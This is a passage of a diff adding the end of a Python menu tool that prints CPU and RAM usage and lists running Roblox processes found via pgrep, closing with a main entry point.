+            print(f"  CPU Cores: {cpu_cores}")
+            
+            if cpu_percent != "N/A":
+                print(f"  CPU Usage: {cpu_percent}%")
+            else:
+                print(f"  CPU Usage: N/A (detection unavailable)")
+            
+            if ram_info:
+                ram_total_gb = ram_info['total_mb'] / 1024
+                ram_used_gb = ram_info['used_mb'] / 1024
+                ram_available_gb = ram_info['available_mb'] / 1024
+                
+                print(f"\n  RAM Total: {ram_total_gb:.2f} GB ({ram_info['total_mb']:.0f} MB)")
+                print(f"  RAM Used: {ram_used_gb:.2f} GB ({ram_info['used_mb']:.0f} MB)")
+                print(f"  RAM Available: {ram_available_gb:.2f} GB ({ram_info['available_mb']:.0f} MB)")
+                print(f"  RAM Usage: {ram_info['percent']}%")
+            else:
+                print(f"  RAM: Detection failed")
+            
+            # Show Roblox processes
+            print(f"\n🎮 ROBLOX PROCESSES:")
+            try:
+                result = subprocess.run(
+                    ['pgrep', '-f', 'com.roblox'],
+                    capture_output=True,
+                    text=True,
+                    timeout=2
+                )
+                pids = result.stdout.strip().split('\n')
+                if pids and pids[0]:
+                    print(f"  Found {len(pids)} Roblox process(es)")
+                    for pid in pids[:5]:
+                        print(f"    PID: {pid}")
+                else:
+                    print("  No Roblox processes running")
+            except:
+                print("  Unable to detect processes")
+            
+            input("\nPress ENTER...")
+        elif c == "0": 
+            break
+
+# =========================
+# MAIN
+# =========================
+if __name__ == "__main__":
+    menu()
